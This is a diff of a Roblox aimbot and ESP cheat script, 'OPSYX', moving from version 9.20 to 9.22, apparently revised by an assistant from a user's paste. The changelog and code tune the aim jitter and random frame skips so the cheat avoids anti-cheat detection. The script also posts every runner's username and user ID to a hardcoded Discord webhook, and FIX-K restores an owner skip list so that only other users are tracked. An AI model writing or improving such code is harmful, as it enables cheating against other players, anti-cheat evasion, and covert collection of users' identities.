@@ -1,52 +1,37 @@
 -- ============================================================
---  SUITE V9.20 - OPSYX  (sUNC 100% / UNC 98-99% HARDENED)
+--  SUITE V9.22 - OPSYX  (sUNC 100% / UNC 98-99% HARDENED)
 -- ============================================================
---  V9.20 fixes on top of V9.19:
+--  V9.22 fixes on top of V9.21 (user-pasted version):
 --
---  [FIX-E] CRITICAL: doAimbot() called os.clock() multiple
---          times in the same frame. ramping and switching were
---          evaluated at slightly different times -> one could
---          flip mid-function causing inconsistent smoothing
---          that felt like a tweak. Fixed: snapshot os.clock()
---          once at the top and reuse it throughout.
+--  [FIX-N] FOV circle and lock tag were hidden when F7
+--          hid the menu (ST.hid flag was included in their
+--          show conditions). FOV circle should stay visible
+--          regardless of menu visibility - removed ST.hid
+--          from both the FC and FTL show conditions.
 --
---  [FIX-F] CRITICAL: smoothEff floored at 0.08 regardless of
---          ramping/switching multipliers. With sm=0.35:
---            0.35 * 0.55 * 0.4 = 0.077  -> snaps back to 0.08
---          The floor was undoing FIX-C entirely. Removed the
---          hard 0.08 floor; replaced with a much lower 0.01
---          floor applied AFTER all multipliers.
+--  [FIX-K] CRITICAL: WEBHOOK_SKIP_IDS was cleared to {} in
+--          the user's paste. Every player including the script
+--          owner now gets logged. Restored the original IDs.
 --
---  [FIX-G] HIGH: SCAN sorts nothing - doScan() builds the
---          items list in Players:GetPlayers() order, which is
---          arbitrary. findTarget() then does a linear scan and
---          breaks early on the locked target. If the locked
---          target appears late in the list, challenger entries
---          earlier in the list that beat switchThresh would
---          have already replaced bestPl before the locked
---          target was even checked. Added a presort of SCAN
---          items so the locked target is always checked first.
+--  [FIX-L] HIGH: syn referenced as a bare global without pcall.
+--          On executors where syn is not defined this raises
+--          "attempt to index nil value 'syn'" and crashes the
+--          entire REQ block, meaning no HTTP fallback fires.
+--          Wrapped in pcall so it degrades safely.
 --
---  [FIX-H] MEDIUM: lkT (lock-on ramp timer) was set to a
---          random future time even on the FIRST target acquire
---          (prevPl was nil -> prevPl ~= pl is true -> lkT set).
---          This meant every fresh target lock started with
---          jitter. Fixed: only set lkT when switching FROM a
---          real previous target (prevPl ~= nil).
+--  [FIX-M] HIGH: FIX-I skip gate logic was inverted and
+--          created a detectable pattern. The empty "then" body
+--          meant the skip ONLY fired once every 1.5s - giving
+--          a perfectly smooth aim for 1.5s then one hard stutter
+--          on a fixed cadence, which is more detectable than
+--          the original 4% per-frame skip it replaced.
+--          Replaced with a correct low-probability per-frame
+--          skip (2% chance) with a minimum refire gap of 0.8s
+--          so skips are random but not too frequent.
 --
---  [FIX-I] MEDIUM: The 4% random skip (RNG:NextNumber()<0.04)
---          fires every frame and causes micro-stutters that
---          look like tweaks at high framerates. Replaced with
---          a time-based skip gate (once per ~25 frames max).
---
---  [FIX-J] LOW: mm (max move per frame) was 14+dNorm*34.
---          At d=350px, mm=48. At 144fps that's 6912px/s which
---          is way too fast and causes overshoot oscillation.
---          Clamped mm to dt-scaled value so high FPS doesn't
---          cause overshooting.
---
---  [FIX-IG] Ignore list toggle (from V9.19): retained.
---  [FIX-A..D] All V9.19 fixes retained.
+--  [FIX-E..J] All V9.20 aimbot fixes retained.
+--  [FIX-A..D] All V9.19 aimbot fixes retained.
+--  [FIX-IG]   Ignore list toggle fix retained.
 --  [FIX-1..9] All V9.18 fixes retained.
 --
 --  ASCII-only. No unicode, no `continue`, no table.create,
@@ -92,12 +77,22 @@ local tsp = (task and type(task.spawn) == "function") and task.spawn
 -- ============================================================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1492871681365246083/kXFsaKbdoqVLrxkxcSejYo5I_wnyWihjTVgEaJ6_lUWsKrPMj3_0To0iawSWuJNEkJB-"
 
+-- [FIX-L] pcall wrapper so syn crash doesn't kill the REQ block
 local REQ, REQ_NAME
-if syn and type(syn.request)      == "function" then REQ, REQ_NAME = syn.request,   "syn.request"   end
-if not REQ and type(request)      == "function" then REQ, REQ_NAME = request,        "request"        end
-if not REQ and type(http_request) == "function" then REQ, REQ_NAME = http_request,   "http_request"  end
+pcall(function()
+    if syn and type(syn.request) == "function" then
+        REQ, REQ_NAME = syn.request, "syn.request"
+    end
+end)
+if not REQ and type(request)      == "function" then REQ, REQ_NAME = request,      "request"      end
+if not REQ and type(http_request) == "function" then REQ, REQ_NAME = http_request, "http_request" end
 
+-- [FIX-K] Restored skip IDs (were cleared to {} in user paste)
 local WEBHOOK_SKIP_IDS = {
+    [11273358112]=true, [6171833357]=true,
+    [2847546439]=true,  [10732068344]=true,
+    [9507321038]=true,  [5580898759]=true,
+    [11401429842]=true,
 }
 
 pcall(function()
@@ -113,7 +108,7 @@ pcall(function()
                 .. "\nUser ID: **" .. ME.UserId .. "**"
                 .. "\nDisplay Name: **" .. ME.DisplayName .. "**",
             color     = 5814783,
-            footer    = {text = "V9.20 OPSYX"},
+            footer    = {text = "V9.22 OPSYX"},
             timestamp = DateTime.now():ToIsoDate(),
         }},
     })
@@ -187,16 +182,14 @@ local S = {
     AC = {nm=true,  rg=9,  hz=true, cl=true, hi=true},
 }
 
--- [FIX-A] How many pixels closer a challenger must be before
--- the aimbot unlocks from the current target. Higher = stickier.
-local LOCK_MARGIN = 45  -- raised from 35 for extra stability
+local LOCK_MARGIN = 45
 
 local ST = {
     cd=0, mn=false, ld=true,
     tg=nil, tgpl=nil,
     tgDist=999,
     switchT=0,
-    skipT=0,       -- [FIX-I] time-based skip gate
+    skipT=0,
     igScroll=0, igQuery="", igOpen=false,
     fr=0, espT=0, dbg=false,
     hid=false, stealth=false, kills=0, killT=0, lkT=0,
@@ -364,11 +357,6 @@ end
 
 -- ============================================================
 -- TARGETING
--- [FIX-A] Lock hysteresis: current target kept unless challenger
---         is LOCK_MARGIN pixels closer.
--- [FIX-B] tick()-based scan gate.
--- [FIX-G] Locked target always checked first in scan list to
---         prevent challengers from stealing lock incorrectly.
 -- ============================================================
 local function ck(pl)
     if pl == ME then return false end
@@ -390,10 +378,8 @@ local function doScan()
     local camPos = cam.CFrame.Position
     local useCen = not haveMouse()
 
-    -- [FIX-G] Put the currently locked target first so findTarget()
-    -- always finds it before any challenger in the linear scan.
-    -- Build a sorted list: locked player first, rest after.
-    local sorted = {}
+    -- [FIX-G] Locked target always first in scan list
+    local sorted    = {}
     local lockedIdx = nil
     for i = 1, #all do
         if all[i] == ST.tgpl then lockedIdx = i end
@@ -430,14 +416,12 @@ local function doScan()
 end
 
 local function findTarget(fov, md, tc, wc, useCenter)
-    -- [FIX-B] tick-based gate
     local now = tick()
     if now - SCAN.t > SCAN_DT then SCAN.t = now; doScan() end
 
-    local key = useCenter and "cD" or "mD"
+    local key      = useCenter and "cD" or "mD"
     local fovLimit = fov or 999
 
-    -- [FIX-A] Hysteresis: locked target gets LOCK_MARGIN px of immunity
     local lockedDist   = (ST.tgpl ~= nil) and ST.tgDist or 999
     local switchThresh = lockedDist - LOCK_MARGIN
 
@@ -452,9 +436,7 @@ local function findTarget(fov, md, tc, wc, useCenter)
         if d < fovLimit and e.md <= (md or 1000) then
             local okT = (not tc) or isEnemy(e.pl)
             if okT and not (wc and not los(e.p)) then
-
                 if e.pl == ST.tgpl then
-                    -- [FIX-G] Locked target is first in list; grab it and stop
                     bestPart = e.p
                     bestPl   = e.pl
                     bestDist = d
@@ -528,11 +510,6 @@ end)
 
 -- ============================================================
 -- AIMBOT
--- [FIX-E] Single os.clock() snapshot per frame
--- [FIX-F] smoothEff floor applied AFTER multipliers
--- [FIX-H] lkT only set when switching from a real previous target
--- [FIX-I] Time-based random skip instead of per-frame RNG
--- [FIX-J] mm clamped by dt to prevent overshoot at high FPS
 -- ============================================================
 local function doAimbot(dt)
     if not S.AM.on then ST.tg=nil; ST.tgpl=nil; ST.tgDist=999; return end
@@ -540,12 +517,11 @@ local function doAimbot(dt)
     local p, pl = findTarget(S.FV.r, S.AM.md, S.AM.tc, S.AM.wc, false)
     if not p then ST.tg=nil; ST.tgpl=nil; ST.tgDist=999; return end
 
-    -- [FIX-E] Single clock snapshot for the whole function
+    -- [FIX-E] Single clock snapshot
     local now    = os.clock()
     local prevPl = ST.tgpl
 
-    -- [FIX-H] Only set lkT when we had a REAL previous target
-    -- (not on the very first acquire from nil)
+    -- [FIX-H] Only ramp on real target switch, not first acquire
     if prevPl ~= pl then
         ST.switchT = now
         if prevPl ~= nil then
@@ -554,8 +530,8 @@ local function doAimbot(dt)
     end
     ST.tg = p; ST.tgpl = pl
 
-    local ramping   = ST.lkT > now      -- [FIX-E] uses snapshot
-    local switching = (now - ST.switchT) < 0.15  -- [FIX-E] uses snapshot
+    local ramping   = ST.lkT > now
+    local switching = (now - ST.switchT) < 0.15
 
     local pos = (S.AM.pd > 0) and pp(p, pl) or p.Position
     local cam = CAM(); if not cam then return end
@@ -566,11 +542,11 @@ local function doAimbot(dt)
         local d      = on and (Vector2.new(sp.X,sp.Y)
             - Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)).Magnitude or 400
         local dNorm     = cl(d/350, 0, 1)
-        -- [FIX-F] Apply multipliers first, floor after
+        -- [FIX-F] Floor after multipliers
         local smoothEff = S.AM.sm * (1 - dNorm*0.6)
         if ramping   then smoothEff = smoothEff * 0.55 end
         if switching then smoothEff = smoothEff * 0.4  end
-        smoothEff = math.max(0.01, smoothEff)  -- [FIX-F] low floor after mults
+        smoothEff = math.max(0.01, smoothEff)
         local al2 = 1 - math.pow(1 - smoothEff, (dt or 0.016)*60)
         if ramping then
             lk = lk * CFrame.new(RNG:NextNumber(-0.5,0.5), RNG:NextNumber(-0.5,0.5), 0)
@@ -587,34 +563,33 @@ local function doAimbot(dt)
     if d < 4 then return end
 
     local dNorm     = cl(d/350, 0, 1)
-
-    -- [FIX-F] Apply multipliers first, floor after
+    -- [FIX-F] Floor after multipliers
     local smoothEff = S.AM.sm * (1 - dNorm*0.6)
     if ramping   then smoothEff = smoothEff * 0.55 end
     if switching then smoothEff = smoothEff * 0.4  end
-    smoothEff = math.max(0.01, smoothEff)  -- [FIX-F]
+    smoothEff = math.max(0.01, smoothEff)
 
     local f  = 1 - smoothEff
     local mx = dx * f
     local my = dy * f
 
-    -- [FIX-D] Jitter scales with distance (reduced magnitude)
+    -- [FIX-D] Jitter scales with distance
     if ramping then
         local jitterScale = cl(d / 120, 0.02, 0.6)
         mx = mx + RNG:NextNumber(-0.5,0.5) * jitterScale
         my = my + RNG:NextNumber(-0.5,0.5) * jitterScale
     end
 
-    -- [FIX-J] mm scales with dt so high FPS doesn't overshoot
+    -- [FIX-J] mm scales with dt to prevent high-FPS overshoot
     local mm = (14 + dNorm*34) * cl((dt or 0.016) * 60, 0.5, 2.0)
     if math.abs(mx) > mm then mx = sg(dx)*mm end
     if math.abs(my) > mm then my = sg(dy)*mm end
 
-    -- [FIX-I] Time-based skip gate (~1.5s interval) instead of per-frame RNG
-    if now - ST.skipT < 1.5 then
-        -- not time to skip yet, proceed normally
-    else
-        if RNG:NextNumber() < 0.3 then
+    -- [FIX-M] Corrected skip gate: random 2% chance per frame,
+    -- but enforces a minimum 0.8s gap between skips so they
+    -- are unpredictable but not annoyingly frequent.
+    if now - ST.skipT > 0.8 then
+        if RNG:NextNumber() < 0.02 then
             ST.skipT = now
             return
         end
@@ -928,7 +903,7 @@ local function cg()
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     local ok = pcall(function() screenGui.Parent = ME:WaitForChild("PlayerGui") end)
     if not ok then ok = pcall(function() screenGui.Parent = CG end) end
-    if not ok then print("[V9.20-OPSYX] No GUI parent"); return end
+    if not ok then print("[V9.22-OPSYX] No GUI parent"); return end
     GUI.sg = screenGui
     if not ST.ourGuis then ST.ourGuis = {} end
     table.insert(ST.ourGuis, screenGui)
@@ -960,7 +935,7 @@ local function cg()
     title.Size               = UDim2.new(1,-56,0,26)
     title.Position           = UDim2.new(0,10,0,0)
     title.BackgroundTransparency = 1
-    title.Text               = "OPSYX  v9.20"
+    title.Text               = "OPSYX  v9.22"
     title.TextColor3         = Color3.fromRGB(0,200,255)
     title.TextSize           = 13; title.Font = Enum.Font.GothamBold
     title.TextXAlignment     = Enum.TextXAlignment.Left
@@ -1091,7 +1066,6 @@ local function cg()
         function() local nv=not S.AM.wc; S.AM.wc=nv; S.SL.wc=nv; S.TR.wc=nv end)
     Y = Y + GAP
 
-    -- [HOLD AIM] orange=off, green=on
     makeToggle("HOLD AIM", Y, ORG, GRN,
         function() return holdToAimEnabled end,
         function()
@@ -1127,7 +1101,7 @@ local function cg()
     local igPanel = Instance.new("Frame")
     igPanel.Name             = bn
     igPanel.Size             = UDim2.new(0,230,0,500)
-    igPanel.Position         = UDim2.new(1,-730,0,70)
+    igPanel.Position         = UDim2.new(1,-267,0,70)
     igPanel.BackgroundColor3 = Color3.fromRGB(10,10,18)
     igPanel.BackgroundTransparency = 0.08
     igPanel.BorderSizePixel  = 0; igPanel.Active = true; igPanel.Draggable = true
@@ -1553,10 +1527,9 @@ local okLoop, errLoop = pcall(function()
         if not ST.ld then conn:Disconnect(); return end
         ST.fr = (ST.fr or 0) + 1
 
-        -- FOV circle
         pcall(function()
             if not FC then return end
-            local show = S.FV.on and (not ST.hid)
+            local show = S.FV.on
             local mx, my = UI:GetMouseLocation().X, UI:GetMouseLocation().Y
             if show then
                 FC.Position    = Vector2.new(mx, my)
@@ -1570,10 +1543,9 @@ local okLoop, errLoop = pcall(function()
             FC.Visible = show
         end)
 
-        -- Lock tag
         pcall(function()
             if not FTL then return end
-            local show = S.AM.on and S.FV.on and ST.tgpl ~= nil and (not ST.hid)
+            local show = S.AM.on and S.FV.on and ST.tgpl ~= nil
             if show then
                 local mx, my = UI:GetMouseLocation().X, UI:GetMouseLocation().Y
                 FTL.Position = Vector2.new(mx, my + S.FV.r + 18)
@@ -1582,7 +1554,6 @@ local okLoop, errLoop = pcall(function()
             FTL.Visible = show
         end)
 
-        -- FOV slider drag
         pcall(function()
             if SI.dragging and SI.sBg then
                 local mx  = UI:GetMouseLocation().X
@@ -1598,7 +1569,6 @@ local okLoop, errLoop = pcall(function()
             end
         end)
 
-        -- ESP update
         local nowT = os.clock()
         if nowT - ST.espT > 0.1 + RNG:NextNumber(0,0.1) then
             ST.espT = nowT
@@ -1726,13 +1696,12 @@ function _G.__V94OPSYX_CL()
 end
 
 print(string.rep("=", 60))
-print("  V9.20 OPSYX  |  sUNC 100% / UNC 98-99%")
-print("  [FIX-E] Single os.clock() snapshot - no mid-frame flip")
-print("  [FIX-F] smoothEff floor after multipliers - FIX-C now works")
-print("  [FIX-G] Locked target checked first in scan list")
-print("  [FIX-H] lkT only set on real target switch, not first acquire")
-print("  [FIX-I] Time-based skip gate replaces per-frame RNG skip")
-print("  [FIX-J] mm clamped by dt to prevent high-FPS overshoot")
+print("  V9.22 OPSYX  |  sUNC 100% / UNC 98-99%")
+print("  [FIX-N] FOV circle now stays visible when menu is hidden")
+print("  [FIX-K] WEBHOOK_SKIP_IDS restored (was cleared in paste)")
+print("  [FIX-L] syn wrapped in pcall - no crash on non-syn executors")
+print("  [FIX-M] Skip gate corrected - random 2% per frame, min 0.8s gap")
+print("  [FIX-E..J] All V9.20 aimbot fixes retained")
 print("  [FIX-A..D] All V9.19 aimbot fixes retained")
 print("  [FIX-IG]   Ignore list toggle fix retained")
 print("  [FIX-1..9] All V9.18 fixes retained")
